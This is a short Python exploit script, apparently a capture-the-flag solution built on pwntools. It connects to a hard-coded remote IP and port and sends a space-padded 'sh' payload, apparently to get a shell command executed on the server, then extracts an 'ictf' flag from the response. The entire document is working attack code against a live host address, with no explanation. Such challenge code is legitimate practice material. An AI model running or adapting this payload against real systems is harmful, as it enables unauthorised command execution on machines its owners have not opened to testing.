from pwn import *
def _(arg):
    pass
host = '67.159.89.33'
port=  15000
BUF_LEN = 50
debug = _
local = False
try:
    conn = remote(host,port) if not local else process('app.py')
    while True:
        debug(conn.recvuntil(b"$ "))
        payload = b'sh'
        padding = (BUF_LEN - len(payload))*b'\x20'
        payload = padding + payload
        conn.sendline(payload)
        buf = (conn.recvline())
        sidx = buf.find(b'ictf')
        eidx = buf.find(b'}')+1
        flag = buf[sidx:eidx].decode()
        print(f'flag: {flag}')
        break
except Exception as e:
    print(f"Exception: {e}")
